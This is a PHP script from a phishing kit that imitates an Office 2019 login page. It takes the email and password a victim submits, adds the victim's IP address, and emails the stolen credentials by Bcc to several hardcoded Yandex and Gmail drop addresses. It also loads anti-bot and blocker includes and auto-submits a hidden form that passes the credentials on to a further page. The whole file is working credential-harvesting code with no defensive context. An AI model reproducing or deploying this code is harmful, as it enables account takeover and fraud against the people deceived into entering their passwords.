<?php
session_start();
error_reporting(0);

include './lib/loca.php';
  include './lib/browser.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office Log ReSulT by-----------------------\n";
$message .= "Email       : ".$_POST['email']."\n";
$message .= "1STPASS]      : ".$_POST['pass']."\n";
$message .= "------------------------IP------------------------------\n";
$message .= "IP                :https://geoiptool.com/en/?ip=$ip\n";$IP=$_POST['IP'];
$message .= "--------------Office Log Created by Pussy----------------------\n";

$send = "";
$bcc="surerexglory@yandex.com,surerexglory@etlgr.com,scott4f808@gmail.com" ;
$subject = "OFFICE 2019 IP :$ip\n";$IP=$_POST['IP'];
$headers .=$_POST['email']."\n";



mail($send, $subject, $message, "Bcc: $bcc");


?>
<?php
$clientemail = $_POST['email'];
$_SESSION['clientemail']=$clientemail;
$passwrd = $_POST['pass'];
$_SESSION['passwrd']=$passwrd;
?>
 <form input type="hidden" id='myForm' method='post' action='login-.php?hdhd92820df8angf264s9df23sd2f1n495K3L2C151645172991f1477dbd26917ef3822423f62e984a91f1477dbd26917ef3822423f62e984a91f1477dbd'>
<input value='<?php echo $clientemail; ?>' name='username' type='hidden' id='Username' data-index='0' maxlength='255' placeholder='Username' class='loginUsername' />
<input value='<?php echo $passwrd; ?>' name='pass' type='hidden' id='Password' placeholder='Password' />";
<input type='submit' name='btnSignIn' value='.' id='btnSignIn' />
</form>
<script type="text/javascript">
    document.getElementById('myForm').submit();
</script>